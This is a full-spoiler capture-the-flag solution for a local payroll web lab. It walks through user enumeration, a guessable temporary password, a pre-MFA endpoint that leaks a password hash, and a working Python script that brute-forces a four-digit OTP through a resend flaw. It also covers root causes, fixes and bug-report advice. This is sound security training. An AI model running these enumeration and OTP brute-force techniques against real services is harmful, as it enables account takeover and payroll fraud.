# Solution — Atlas Payroll

Full spoilers.

## Recon before either objective

Sign in normally as Juliette. The code arrives in `/mailbox`:

> Your sign-in code is **4817**. It is valid for this sign-in attempt.

Two facts worth writing down: **codes are four digits** (a 10,000-value
keyspace, not 1,000,000), and the help centre at `/help/first-sign-in`
says earlier codes keep working after a resend.

`/directory` lists everyone with an Atlas account, including
`n.varga@atlas.example` — **Nadia Varga, Payroll Administrator**. That is
the account worth having.

## Objective 1 — `HxBugLabs{h4lf_4uth3nt1c4t3d_1s_4uth3nt1c4t3d}`

### Step 1: confirm the account exists

The sign-in form answers differently depending on which half is wrong:

```bash
curl -s -X POST http://localhost:8082/login -d 'email=nobody@atlas.example&password=x' | grep -o 'No Atlas[^<]*'
# No Atlas account uses that address.

curl -s -X POST http://localhost:8082/login -d 'email=n.varga@atlas.example&password=x' | grep -o 'That password[^<]*'
# That password is not correct for this account.
```

Classic user enumeration. On its own, a low. Combined with a known
password format, it turns password spraying from guesswork into a
two-request operation.

### Step 2: the temporary-password pattern

`/help/first-sign-in` documents it in plain text:

> `Atlas` + the year you joined + `!`

and the directory shows start dates. Nadia Varga started in 2025 and
never changed her temporary password:

```bash
curl -s -c jar -o /dev/null -w '%{http_code}\n' -X POST http://localhost:8082/login \
  -d 'email=n.varga@atlas.example&password=Atlas2025!'
# 302  → redirected to /mfa, so the password was accepted
```

You are now at the code screen for an administrator's account. MFA is
doing its job — you cannot get past it yet.

### Step 3: read what the half-authenticated session gives you

The code screen greets you by name and title. Something had to fetch
that. Look at what it actually fetched:

```bash
curl -s -b jar http://localhost:8082/api/session/pending | python3 -m json.tool
```

```json
{
  "stage": "awaiting-code",
  "codeLength": 4,
  "user": {
    "id": 12,
    "email": "n.varga@atlas.example",
    "name": "Nadia Varga",
    "password": "$2a$10$...",
    "role": "admin",
    "employeeNumber": "ATL-1402",
    "temporaryPassword": true,
    "hrNote": "Approver for EU payroll runs. Onboarding token HxBugLabs{h4lf_4uth3nt1c4t3d_1s_4uth3nt1c4t3d}"
  }
}
```

The endpoint serialises the whole user record — including the bcrypt hash
and an internal HR note — to a session that has passed exactly one of two
factors.

### Root cause

`GET /api/session/pending` treats "a sign-in is in progress" as
"authenticated enough". A pending-MFA session is an **unauthenticated**
session that happens to know a password; the only thing it should be
allowed to learn is that a code was sent, and to which masked address.

The second failure is the object it returns. The handler passes the user
record straight to `res.json()`, so every field the model gains later is
published automatically. On real targets this is the single most common
source of accidental disclosure: no serializer, no allow-list of fields,
just `res.json(user)`.

Worth internalising for real programs: the pre-MFA state is a genuinely
under-tested surface. Password reset, "signing in as", device-trust and
"which factors does this account have" endpoints are routinely reachable
there, and they are routinely forgotten by whoever wrote the MFA gate.

## Objective 2 — `HxBugLabs{r3s3nd_st4ck3d_th3_k3ysp4c3_1n_y0ur_f4v0ur}`

You still need Nadia's code, and her mailbox is not reachable. So do not
try to read the code — change the odds of guessing one.

### The three properties that combine

Read `POST /mfa/resend` and `POST /mfa/verify` together:

1. **Four digits.** 10,000 possible codes.
2. **Resend appends.** `entry.codes.push(code)` — every previous code for
   that user is still accepted. After *n* resends there are *n+1* live
   codes and any of them passes.
3. **Resend resets the attempt counter.** `entry.attempts = 0`. The
   five-attempt limit is not a limit on attempts; it is a limit on
   attempts between resends, and resends are unlimited.

Property 3 alone makes brute force possible. Property 2 makes it fast:
after *n* resends, each guess has an *(n+1)/10000* chance instead of
*1/10000*, and the chance you have already collected a matching code
grows with every round.

### The exploit

```python
import http.cookiejar, urllib.request, urllib.parse, sys

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
BASE = "http://localhost:8082"

def post(path, data=None):
    body = urllib.parse.urlencode(data).encode() if data else b""
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    try:
        return opener.open(req)
    except urllib.error.HTTPError as e:
        return e

post("/login", {"email": "n.varga@atlas.example", "password": "Atlas2025!"})

guess = 0
for _ in range(400):
    post("/mfa/resend")               # +1 live code, attempts back to zero
    for _ in range(5):                # MAX_ATTEMPTS per reset
        code = f"{guess:04d}"
        guess += 1
        r = post("/mfa/verify", {"code": code})
        if r.status == 302 or "/dashboard" in r.geturl():
            print("hit on", code)
            print(opener.open(BASE + "/admin/payroll-runs").read().decode())
            sys.exit(0)
```

A representative run:

```
hit on 0322 after 389 requests, 65 resends
flag: HxBugLabs{r3s3nd_st4ck3d_th3_k3ysp4c3_1n_y0ur_f4v0ur}
```

Under four hundred requests, no rate limiting hit, no lockout, no alert.
You are signed in as the payroll administrator with a full session, and
`/admin/payroll-runs` hands over the approver token for a EUR 3.1M run.

### Root cause

Each property was a reasonable-sounding decision made in isolation:

- Four digits because support pushed back on six.
- Codes accumulate so a delayed email does not invalidate the code
  someone is already typing.
- The counter resets on resend so a genuine "I never got it" does not
  lock the user out.

Together they cancel the second factor entirely. This is the shape of
most real MFA findings: not one broken check, but a rate limit that
counts the wrong thing.

Concretely, the fix is any one of:

- **Invalidate on issue.** A new code replaces the old one. Non-negotiable.
- **Count attempts against the account and the source, not against the
  code.** The counter must survive a resend, and resends themselves must
  be limited (and back off).
- **Widen the keyspace.** Six digits at minimum; four digits with any
  brute-force headroom is broken by arithmetic alone.

### What to check on a real target

The measurable version of this test, which you can run against any OTP
flow you are authorised to test:

1. How many digits? Anything under six is a finding on its own once a
   limit is bypassable.
2. Does an old code still verify after a resend? Request two, try the
   first.
3. Does the failure counter reset on resend, on a new session cookie, on
   a new source IP (`X-Forwarded-For`), or on re-submitting the password
   step?
4. Is the limit per code, per account, or per source? Only per-account
   survives contact with an attacker.
5. Does the lockout, when it triggers, actually apply to the *verify*
   endpoint — or only to the browser flow that calls it?

## Notes for the report

File these as one chained submission, not two, with the ATO as the
headline: *"Password spraying plus OTP rate-limit bypass yields full
takeover of a payroll administrator account."* The pre-auth disclosure is
strong supporting evidence — it is how you confirmed the target account
was an admin before spending requests on it — and mentioning that you
retrieved the bcrypt hash from an unauthenticated session raises the
severity of that endpoint on its own.

Include the request count. "389 requests, no lockout" is the number that
makes a triager reproduce it; "MFA can be brute-forced" is the sentence
that gets it closed as informative.
